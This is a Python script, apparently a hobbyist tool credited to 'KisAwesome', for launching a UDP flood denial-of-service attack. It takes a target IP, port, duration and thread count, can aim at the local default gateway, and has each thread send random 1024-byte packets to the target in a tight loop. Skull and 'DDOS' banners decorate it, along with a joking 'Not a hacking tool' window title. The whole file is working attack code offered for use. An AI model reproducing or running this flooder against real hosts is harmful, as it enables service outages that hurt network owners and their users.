import socket
import time
import random
import os
import threading
import zono.colorlogger as cl
import sys
import datetime
import netifaces
import tqdm


def usage():
    print('ddos <IP> <PORT> <DURATION IN SECONDS> <Threads Optional defaults to 8>')


def skull():
    os.system("clear")
    clear = "\x1b[0m"

    colors = [31]

    x = '''
                     .ed"""" """$$$$be.
                   -"           ^""**$$$e.
                 ."                   '$$$c
                /                      "4$$b
               d  3                      $$$$
               $  *                   .$$$$$$
              .$  ^c           $$$$$e$$$$$$$$.
              d$L  4.         4$$$$$$$$$$$$$$b
              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
               "*$$$  *=%4.$ L L$ P3$$$F $$$P"
                  "$   "%*ebJLzb$e$$$$$b $P"
                    %..      4$$$$$$$$$$ "
                     $$$e   z$$$$$$$$$$%
                      "*$c  "$$$$$$$P"
                       ."""*$$$$$$$$bc
                    .-"    .$***$$$"""*e.
                 .-"    .e$"     "*$c  ^*b.
          .=*""""    .e$*"          "*bc  "*$e..
        .$"        .z*"               ^*$e.   "*****e.
        $$ee$c   .d"                     "*$.        3.
        ^*$E")$..$"                         *   .ee==d%
           $.d$$$*                           *  J$$$e*
            """""                              "$$$"

			                  '''
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write(" \x1b[1;%dm%s%s\n " %
                         (random.choice(colors), line, clear))
        time.sleep(0.05)


ART = '''
████████▄  ████████▄   ▄██████▄    ▄████████
███   ▀███ ███   ▀███ ███    ███  ███    ███
███    ███ ███    ███ ███    ███  ███    █▀
███    ███ ███    ███ ███    ███  ███
███    ███ ███    ███ ███    ███  ██████████
███    ███ ███    ███ ███    ███         ███
███   ▄███ ███   ▄███ ███    ███   ▄█    ███
████████▀  ████████▀   ▀██████▀  ▄████████▀

By KisAwesome
'''

sent = 0


def main(args):

    os.system('title Not a hacking tool😀')
    try:
        victim = args[0]
    except:
        print('Target ip must be first argument')
        return

    try:
        vport = args[1]

    except:
        print('Port Must be second arguments')
        return
    try:
        duration = args[2]
    except:
        print('Duration Must be third argument')

    try:
        vport = int(vport)
    except:
        print('Port Must be An integer')
        return
    try:
        duration = int(duration)
    except:
        print('Duration must be an integer')
        return
    verbose = False
    if '-v' in args:
        verbose = True

    THREADS = 8
    THREADS_LIST = []
    try:
        tnum = args[3]
        THREADS = tnum
    except:
        pass

    try:
        THREADS = int(THREADS)
    except:
        print('Threads must be an integer')
        return

    if victim.upper() == 'GATEWAY':
        gateway = netifaces.gateways()['default'][2][0]
        victim = gateway

    def check_ip(victim, vport):
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            msgbytes = random._urandom(1024)
            client.sendto(msgbytes, (victim, vport))

        except socket.gaierror as e:
            cl.error(f'Invalid Ip address,Unable to connect to ip {e}')
            return

    try:
        check_ip(victim, vport)
        skull()
        os.system('clear')
        print(ART)
        if duration == 0:
            cl.error('Putting 0 as the duration makes the script run indefinatly')
            print()

        os.system('title DDOS')
        input('Press Enter To continue')
        currDate = datetime.datetime.now()
        currDate += datetime.timedelta(seconds=duration)
        timeout = currDate.time()
        if duration == 0:
            timeout = None

        cl.info(
            f'Starting attack at {victim}:{vport} for {duration} seconds using {THREADS} threads')

        def flood(thread_id):
            global sent
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                msgbytes = random._urandom(1024)

                while True:
                    if timeout:
                        if timeout < datetime.datetime.now().time():

                            break
                    client.sendto(msgbytes, (victim, vport))
                    sent += 1

            except socket.gaierror:
                cl.error('\r\nInvalid Ip address,Unable to connect to ip')

        for i in range(THREADS):
            thread = threading.Thread(target=flood, args=(i,), daemon=True)
            THREADS_LIST.append((thread, i))
            thread.start()

        if duration == 0:
            for i in tqdm.tqdm(range(1000000000), desc='Attack duration remaining :', unit='S'):
                time.sleep(1)
        else:
            for i in tqdm.tqdm(range(duration), desc='Attack duration remaining : ',  unit='S'):
                time.sleep(1)

        for thread in THREADS_LIST:
            thread[0].join()

            thread_id = thread[1]
            if verbose:
                print()
                cl.log(f'Succsesfully Stopped thread {thread_id}')

        if verbose:
            print()
            cl.log('Terminated all threads')
            print()
        cl.major_log(
            f'Attack completed sent a total of {sent} packets to {victim}:{vport}')

    except KeyboardInterrupt:
        cl.major_log('Operation cancelled by user')
        return
    except EOFError:
        cl.major_log('Operation cancelled by user')
        return


main(sys.argv)